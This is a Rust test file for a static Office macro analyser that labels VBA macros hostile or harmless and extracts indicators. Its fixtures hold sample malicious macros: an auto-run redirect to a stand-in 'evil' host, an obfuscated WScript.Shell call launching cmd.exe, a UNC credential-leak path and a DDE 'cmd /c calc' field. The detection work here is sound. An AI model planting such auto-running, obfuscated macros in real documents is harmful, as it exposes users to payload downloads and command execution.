// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPLv3 section 7: see LICENSE_ADDITIONAL_TERMS.md in the repository root.

//! Tests of the static macro explainer: nothing here runs a macro.

use super::{IocKind, Verdict, deobfuscate, explain_kind, explain_macro};
use crate::report::{MacroIntent, MacroLanguage, MacroModule, ThreatKind};

fn module(source: &str, intent: MacroIntent, auto_exec: &[&str]) -> MacroModule {
    MacroModule {
        language: MacroLanguage::Vba,
        location: "word/vbaProject.bin".to_owned(),
        name: "Module1".to_owned(),
        source: source.to_owned(),
        truncated: false,
        auto_exec: auto_exec.iter().map(|s| (*s).to_owned()).collect(),
        suspicious: Vec::new(),
        iocs: Vec::new(),
        intent,
        behaviors: Vec::new(),
        procedures: Vec::new(),
    }
}

const REDIRECT: &str = r#"
Sub AutoOpen()
    Dim u As String
    u = "ht" & "tp://evil." & Chr(101) & "xample.test/pay"
    openRedirectURL u
End Sub
Sub openRedirectURL(target As String)
    ThisDocument.FollowHyperlink target
End Sub
"#;

const COUNTING: &str = r#"
Sub CountThings()
    Dim n As Long, c As Long, p As Long
    n = ActiveDocument.Tables.Count
    c = ActiveDocument.Tables(1).Columns.Count
    p = ActiveDocument.ComputeStatistics(wdStatisticPages)
    MsgBox "Tables: " & n & ", columns: " & c & ", pages: " & p
End Sub
"#;

const OBFUSCATED_SHELL: &str = r#"
Sub Document_Open()
    Dim s As Object
    Set s = CreateObject("WScr" & "ipt.Sh" & "ell")
    s.Run Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
End Sub
"#;

#[test]
fn a_redirect_macro_is_hostile_and_its_address_is_unfolded() {
    let m = module(REDIRECT, MacroIntent::Suspicious, &["AutoOpen"]);
    let e = explain_macro(&m);
    assert_eq!(e.verdict, Verdict::Hostile);
    assert!(e.title.ru.contains("перенаправления"), "{:?}", e.title);
    assert!(e.summary.ru.contains("http://evil.example.test/pay"), "{:?}", e.summary);
    assert!(e.summary.en.contains("redirect you"), "{:?}", e.summary);
    assert!(
        e.iocs.iter().any(|i| i.kind == IocKind::Url && i.value == "http://evil.example.test/pay"),
        "{:?}",
        e.iocs
    );
    assert!(e.iocs.iter().any(|i| i.value == "openRedirectURL"));
    assert!(e.steps.iter().any(|s| s.ru.contains("Запускается сам") && s.ru.contains("AutoOpen")));
    assert!(e.steps.iter().any(|s| s.ru.contains("Текст собран из кусков")));
    // The last step is the conclusion, in both languages.
    let last = e.steps.last().expect("a conclusion");
    assert!(last.ru.starts_with("Вывод") && last.en.starts_with("Conclusion"));
}

#[test]
fn a_macro_that_only_counts_is_harmless() {
    let e = explain_macro(&module(COUNTING, MacroIntent::Benign, &[]));
    assert_eq!(e.verdict, Verdict::Harmless);
    assert!(e.summary.ru.contains("Безобидный вычислительный макрос"), "{:?}", e.summary);
    assert!(e.summary.ru.contains("не обращается к ОС или сети"));
    assert!(e.summary.en.contains("never touches the OS or the network"));
    let counted =
        e.steps.iter().find(|s| s.ru.starts_with("Только считает")).expect("what it counts");
    assert!(
        counted.ru.contains("таблицы")
            && counted.ru.contains("столбцы")
            && counted.ru.contains("страницы")
    );
    assert!(e.iocs.is_empty(), "{:?}", e.iocs);
}

#[test]
fn an_obfuscated_wscript_shell_is_found_even_when_the_intent_looked_benign() {
    let e = explain_macro(&module(OBFUSCATED_SHELL, MacroIntent::Benign, &["Document_Open"]));
    assert_eq!(e.verdict, Verdict::Hostile);
    assert!(
        e.iocs.iter().any(|i| i.kind == IocKind::Call && i.value == "WScript.Shell"),
        "{:?}",
        e.iocs
    );
    assert!(e.steps.iter().any(|s| s.ru.contains("WScript.Shell")), "{:?}", e.steps);
}

#[test]
fn folding_joins_and_chr_calls_gives_the_real_text() {
    let (text, folds) = deobfuscate(r#"x = "ht" & "tp" + "://" & Chr(97) & Chr$(98)"#);
    assert_eq!(text, r#"x = "http://ab""#);
    assert_eq!(folds, 6);
    // A doubled quote inside a literal is one quote, not the end of the literal.
    let (kept, none) = deobfuscate(r#"y = "say ""hi"" " & "now""#);
    assert_eq!(kept, r#"y = "say ""hi"" now""#);
    assert_eq!(none, 1);
    // Chr(34) and a name that merely ends in "chr" are left alone.
    let (same, zero) = deobfuscate("a = Chr(34): b = mychr(65)");
    assert_eq!(same, "a = Chr(34): b = mychr(65)");
    assert_eq!(zero, 0);
}

#[test]
fn a_unc_path_is_an_indicator_of_a_credential_leak() {
    let e = explain_macro(&module(
        r#"Documents.Open "\\files.example.test\share\a.docx""#,
        MacroIntent::Suspicious,
        &[],
    ));
    assert!(
        e.iocs
            .iter()
            .any(|i| i.kind == IocKind::Unc && i.value.starts_with("\\\\files.example.test"))
    );
    assert!(e.steps.iter().any(|s| s.en.contains("password hash")));
    assert_ne!(e.verdict, Verdict::Harmless);
}

#[test]
fn every_kind_of_finding_has_an_explanation_in_both_languages() {
    for kind in ThreatKind::ALL {
        let e = explain_kind(*kind, "detail");
        assert!(!e.title.ru.is_empty() && !e.title.en.is_empty(), "{}", kind.id());
        assert!(!e.summary.ru.is_empty() && !e.summary.en.is_empty(), "{}", kind.id());
        assert!(e.steps.len() >= 2, "{}", kind.id());
    }
    let dde = explain_kind(ThreatKind::DdeField, "cmd /c calc");
    assert_eq!(dde.verdict, Verdict::Hostile);
    assert!(dde.title.ru.contains("DDE"));
    let tpl = explain_kind(ThreatKind::RemoteTemplate, "http://x.test/t.dotm");
    assert!(tpl.title.en.contains("NTLM"));
}
